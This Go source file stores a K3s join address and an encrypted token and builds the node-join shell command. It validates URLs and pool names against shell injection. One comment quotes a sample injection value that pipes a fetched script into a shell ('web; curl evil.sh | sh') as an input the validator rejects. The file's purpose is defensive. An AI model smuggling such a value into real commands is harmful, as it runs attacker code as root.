// Package cluster answers one question: how does a machine join this cluster.
//
// It is deliberately small and deliberately separate from the orchestrator.
// The orchestrator seam earns its keep by not knowing which Kubernetes it is
// talking to — it applies workloads, and a Noop implementation stands in for a
// cluster that is not there. K3S_URL and K3S_TOKEN are K3s specifics, so
// putting them behind that seam would be the first crack in it: every future
// distribution would widen an interface that no orchestrator method needs.
package cluster

import (
	"context"
	"errors"
	"fmt"
	"log/slog"
	"net/url"
	"regexp"
	"strings"

	"github.com/google/uuid"
	"github.com/jackc/pgx/v5"
	"github.com/jackc/pgx/v5/pgtype"
	"github.com/jackc/pgx/v5/pgxpool"

	"github.com/codeblocktz/yacht/internal/secret"
	"github.com/codeblocktz/yacht/internal/store/dbgen"
)

// ErrNotConfigured means nobody has stored a server address and join token.
var ErrNotConfigured = errors.New("cluster: no join settings are stored")

// ErrNoSecretKey means a join token was offered with no key to seal it.
//
// Refusing is the point, for the reason the app service refuses a secret
// variable: storing it readable would give the protection in name only, and
// there would be no way to tell from the outside.
var ErrNoSecretKey = errors.New(
	"cluster: no YACHT_SECRET_KEY is configured, so a join token cannot be stored safely")

// PoolLabel is the node label a pool is carried in.
const PoolLabel = "yacht/pool"

// A Kubernetes label value, which is also the shape that makes a pool safe to
// interpolate into a command somebody pastes into a root shell. Every
// character that could end the command and start another one — a semicolon, a
// backtick, a newline, a space, a dollar — is outside this set already.
var poolRE = regexp.MustCompile(`^[a-z0-9]([-a-z0-9._]*[a-z0-9])?$`)

// Joiner stores the join settings and builds the command.
type Joiner struct {
	pool   *pgxpool.Pool
	q      *dbgen.Queries
	keeper *secret.Keeper
	log    *slog.Logger
}

// New returns a Joiner. keeper may be nil, in which case storing settings is
// refused rather than done unsafely.
func New(pool *pgxpool.Pool, keeper *secret.Keeper, log *slog.Logger) *Joiner {
	if log == nil {
		log = slog.Default()
	}
	return &Joiner{pool: pool, q: dbgen.New(pool), keeper: keeper, log: log}
}

// Settings is what the join settings look like from outside this package.
//
// It carries no token. Everything that renders a page takes one of these, so
// the token cannot reach a template by being carried somewhere it was not
// needed — the same reason app.Variable does not carry a secret's value.
type Settings struct {
	ServerURL string
	TokenSet  bool
	UpdatedAt string
}

// Settings returns the stored settings without the token.
func (j *Joiner) Settings(ctx context.Context) (Settings, error) {
	row, err := j.q.GetClusterJoin(ctx)
	if err != nil {
		if errors.Is(err, pgx.ErrNoRows) {
			return Settings{}, ErrNotConfigured
		}
		return Settings{}, fmt.Errorf("cluster: read join settings: %w", err)
	}
	return Settings{
		ServerURL: row.ServerUrl,
		TokenSet:  len(row.TokenSealed) > 0,
		UpdatedAt: row.UpdatedAt.Format("2006-01-02 15:04"),
	}, nil
}

// SetJoin stores the address agents connect back to, and the token they use.
func (j *Joiner) SetJoin(ctx context.Context, serverURL, token string, by uuid.UUID) error {
	serverURL = strings.TrimSpace(serverURL)
	token = strings.TrimSpace(token)

	if err := ValidateServerURL(serverURL); err != nil {
		return err
	}
	if token == "" {
		return errors.New("a join token is required")
	}
	if !j.keeper.Configured() {
		return ErrNoSecretKey
	}

	sealed, err := j.keeper.Seal(token)
	if err != nil {
		return fmt.Errorf("cluster: seal join token: %w", err)
	}

	var updatedBy pgtype.UUID
	if by != uuid.Nil {
		updatedBy = pgtype.UUID{Bytes: by, Valid: true}
	}
	if _, err := j.q.SetClusterJoin(ctx, dbgen.SetClusterJoinParams{
		ServerUrl: serverURL, TokenSealed: sealed, UpdatedBy: updatedBy,
	}); err != nil {
		return fmt.Errorf("cluster: store join settings: %w", err)
	}

	// The address is logged and the token is not. Which server agents are
	// pointed at is what an operator needs to check; the token is the thing
	// this whole table exists to keep out of places like a log file.
	j.log.Info("cluster join settings changed",
		slog.String("server_url", serverURL), slog.String("by", by.String()))
	return nil
}

// Command returns the line to run on a machine to join it to this cluster.
//
// The returned string contains the join token in the clear, because that is
// what the person running it needs. It is the only thing in this package that
// carries the token, and the only caller is the page an owner asked for.
func (j *Joiner) Command(ctx context.Context, pool string) (string, error) {
	if err := ValidatePool(pool); err != nil {
		return "", err
	}

	row, err := j.q.GetClusterJoin(ctx)
	if err != nil {
		if errors.Is(err, pgx.ErrNoRows) {
			return "", ErrNotConfigured
		}
		return "", fmt.Errorf("cluster: read join settings: %w", err)
	}
	if err := ValidateServerURL(row.ServerUrl); err != nil {
		// Stored before the rule existed, or edited in the database. Refusing
		// beats handing somebody a command built from an address this package
		// would not accept today.
		return "", fmt.Errorf("cluster: stored server address is not usable: %w", err)
	}

	token, err := j.keeper.Open(row.TokenSealed)
	if err != nil {
		// Named without the bytes. Which secret cannot be opened is what fixes
		// it, and the wrapped error says whether the key that sealed it is one
		// this install no longer holds or the stored value was altered.
		return "", fmt.Errorf("cluster: opening the join token: %w", err)
	}

	return BuildCommand(row.ServerUrl, token, pool), nil
}

// BuildCommand assembles the join line.
//
// Split out from Command so the interesting half — turning three values into
// something that will be pasted into a root shell — is a pure function with no
// database and no cluster behind it.
func BuildCommand(serverURL, token, pool string) string {
	cmd := "curl -sfL https://get.k3s.io | K3S_URL=" + serverURL +
		" K3S_TOKEN=" + token + " sh -s -"
	if pool != "" {
		cmd += " --node-label " + PoolLabel + "=" + pool
	}
	return cmd
}

// ValidateServerURL checks the address an agent will connect back to.
func ValidateServerURL(raw string) error {
	if raw == "" {
		return errors.New("a server address is required, for example https://10.0.0.1:6443")
	}
	u, err := url.Parse(raw)
	if err != nil {
		return fmt.Errorf("server address is not a URL: %w", err)
	}
	// https only. The token travels to this address, and an agent pointed at
	// http would hand it to anything on the path.
	if u.Scheme != "https" {
		return errors.New("server address must start with https://")
	}
	if u.Host == "" {
		return errors.New("server address has no host")
	}
	// The address goes into the command unquoted, so anything a shell would
	// read as more than one word cannot be allowed through, whatever url.Parse
	// made of it.
	if strings.ContainsAny(raw, " \t\n\r;&|<>$`'\"\\(){}*?[]!#~") {
		return errors.New("server address contains characters a shell would act on")
	}
	return nil
}

// ValidatePool checks a pool name.
//
// The rule is Kubernetes' own for a label value, which happens to exclude
// every character that could end the command and start another one. A pool
// called `web; curl evil.sh | sh` is refused here rather than quoted and hoped
// over, because the result is pasted into a root shell.
func ValidatePool(pool string) error {
	if pool == "" {
		return nil // no label, which is a normal node
	}
	if len(pool) > 63 {
		return errors.New("pool name must be at most 63 characters")
	}
	if !poolRE.MatchString(pool) {
		return errors.New(
			"pool name must be lowercase letters, numbers, dashes, dots and underscores, " +
				"starting and ending with a letter or number")
	}
	return nil
}
